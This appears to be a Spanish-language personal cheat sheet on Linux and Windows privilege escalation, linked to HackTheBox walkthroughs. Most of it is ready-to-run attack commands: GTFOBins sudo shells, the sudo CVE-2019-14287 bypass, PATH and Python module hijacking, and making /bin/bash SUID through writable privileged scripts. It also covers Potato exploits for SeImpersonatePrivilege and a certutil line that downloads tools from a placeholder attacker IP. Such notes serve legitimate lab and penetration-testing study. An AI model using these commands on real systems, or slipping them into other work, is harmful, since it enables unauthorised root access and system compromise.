---
tags:
  - Chuletas
---
# Escalada de privilegios

## Enumeración inicial
- `sudo -l` (qué puedo ejecutar como otro usuario)
- `find / -perm -4000 -type f 2>/dev/null` (binarios SUID)
- `find / -perm -u=s 2>/dev/null`
- `crontab -l` y `cat /etc/crontab` (tareas programadas)
- `linpeas.sh` / `winPEAS` · `pspy64` (procesos y cron sin privilegios)

## Vías habituales (Linux)
- **`sudo -i` / `sudo su` (sudoer con permisos totales)**: si `sudo -l` muestra
  `(ALL : ALL) ALL` —o el usuario está en el grupo `sudo`/`wheel`—, ya está autorizado en
  `/etc/sudoers` a ejecutar cualquier cosa como root. `sudo -i` abre una **shell de login de
  root** (carga el entorno de root y entra en `/root`); `sudo su` hace algo parecido.
  Normalmente pide **la contraseña del propio usuario**, no la de root, así que basta con haber
  recuperado esa credencial. Es la escalada "por diseño": no explotas un fallo, usas un permiso
  legítimo mal concedido.
  ```bash
  sudo -l        # ¿(ALL : ALL) ALL?  → eres sudoer total
  sudo -i        # shell de root (login completo)
  ```
  Ejemplo: [Blocky](../red-team/walkthroughs/web.md#blocky-htb) (el usuario `notch` es sudoer).
- **GTFOBins**: binario permitido por `sudo`/SUID → consultar en [gtfobins.github.io](https://gtfobins.github.io/)
  - `find`: `sudo find . -exec /bin/sh \; -quit`
  - `php`: `sudo -u <user> php -r 'system("/bin/sh -i");'`
  - `sed`, `bpftrace --unsafe`, `logrotate`, etc.
- **sudo CVE-2019-14287** (sudo **< 1.8.28**): si `sudo -l` permite ejecutar como *cualquier*
  usuario salvo root (regla tipo `(ALL, !root)`), se fuerza el UID de root pasando `-1`:
  ```bash
  sudo -V                      # ver versión (p. ej. 1.8.25p1 = vulnerable)
  sudo -u#-1 /bin/bash         # -1 se interpreta como UID 0 (root)
  sudo -u#4294967295 /bin/bash # equivalente (-1 sin signo)
  ```
  Ejemplo: [Blunder](../red-team/walkthroughs/web.md#blunder-htb).
- **Secuestro de $PATH**: script que llama a un binario sin ruta absoluta →
  crear binario falso en `/tmp`, `export PATH=/tmp:$PATH`
- **Secuestro de módulo Python**: script como otro usuario que importa un módulo →
  crear `modulo.py` con `import os; os.system("/bin/bash")` en el `$PATH` del script
- **Script editable + sudo**: `echo 'chmod u+s /bin/bash' >> script.sh` → `/bin/bash -p`
- **Cron como root** con fichero de entrada controlable (p. ej. Curling: `curl -K input`)
- **chattr / lsattr**: quitar inmutabilidad (`chattr -i`) antes de sobrescribir un script privilegiado
- **SUID bash**: `echo "chmod +s /bin/bash" >> <script-privilegiado>` → `/bin/bash -p`

## Estabilizar la shell
```
python3 -c "import pty; pty.spawn('/bin/bash')"
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm-256color
```

## Potato (Windows — abuso de SeImpersonatePrivilege)
Cuando `whoami /priv` muestra `SeImpersonatePrivilege`:

| Sistema | Herramienta |
|---|---|
| Win7 / Server 2008–2016 | JuicyPotato |
| Server 2019 | JuicyPotatoNG |
| Server 2019 (endurecido) | RoguePotato |
| Win10 2004+ | GodPotato |
| Win10 / Server 2019 | SweetPotato / PrintSpoofer |

Subir con `certutil -urlcache -split -f http://<ip>/tool.exe tool.exe`.

**LOLBAS** para living-off-the-land en Windows: [lolbas-project.github.io](https://lolbas-project.github.io/).
